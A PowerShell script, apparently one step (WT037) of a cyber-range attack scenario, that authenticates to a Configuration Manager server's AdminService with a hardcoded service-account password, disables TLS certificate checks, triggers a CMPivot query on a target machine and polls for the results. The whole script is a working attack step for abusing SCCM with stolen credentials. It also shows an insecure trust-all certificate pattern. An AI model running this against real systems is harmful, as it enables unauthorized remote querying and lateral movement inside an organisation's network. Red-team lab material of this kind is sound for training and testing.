# WT037: CMPivot on MBR02 via AdminService as svc_sccm — analyst_t1 (ATTACK from ws01)
$ErrorActionPreference = 'Stop'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
# Trust-all certs (self-signed lab cert)
Add-Type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy {
    public bool CheckValidationResult(ServicePoint srvPoint, X509Certificate certificate, WebRequest request, int certificateProblem) { return true; }
}
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy

$mp = 'mbr02.range.local'
$target = 'MBR02'
$resourceId = 16777219
$query = 'LogicalDisk'
$svcUser = 'range\svc_sccm'
$svcPass = 's3rv1c3_SCCM!'
$sec = ConvertTo-SecureString $svcPass -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($svcUser, $sec)

Write-Output "=== WT037 CMPivot: $query on $target (ResourceID=$resourceId) via AdminService as svc_sccm ==="

# 1. Trigger
$url = "https://$mp/AdminService/v1.0/Device($resourceId)/AdminService.RunCMPivot"
$body = "{`"InputQuery`":`"$query`"}"
Write-Output ("[1] POST " + $url)
Write-Output ("    body=" + $body)
$r = Invoke-WebRequest -Uri $url -Method Post -Body $body -ContentType 'application/json' -Credential $cred -UseBasicParsing -TimeoutSec 30
Write-Output ("    status=" + $r.StatusCode)
Write-Output ("    resp=" + $r.Content)
$opId = $null
if ($r.Content -match '"OperationId"\s*:\s*(\d+)') { $opId = $matches[1] }
if (-not $opId) { throw "No OperationId in response" }
Write-Output ("[+] OperationId=" + $opId)

# 2. Poll results
$resUrl = "https://$mp/AdminService/v1.0/Device($resourceId)/AdminService.CMPivotResult(OperationId=$opId)"
Write-Output ("[2] Polling " + $resUrl)
$done = $false
for ($i = 1; $i -le 20; $i++) {
    Start-Sleep -Seconds 5
    try {
        $pr = Invoke-WebRequest -Uri $resUrl -Credential $cred -UseBasicParsing -TimeoutSec 15
        if ($pr.StatusCode -eq 200) {
            Write-Output ("[+] Results ready (attempt " + $i + ")")
            Write-Output $pr.Content
            $done = $true
            break
        }
    } catch {
        $code = 0
        if ($_.Exception.Response) { $code = [int]$_.Exception.Response.StatusCode }
        Write-Output ("    attempt " + $i + ": HTTP " + $code + " (not ready yet)")
        if ($code -eq 404 -or $code -eq 0) { continue }
        throw $_
    }
}
if (-not $done) { Write-Output "[!] Timed out waiting for CMPivot results" }
Write-Output 'WT037_DONE'
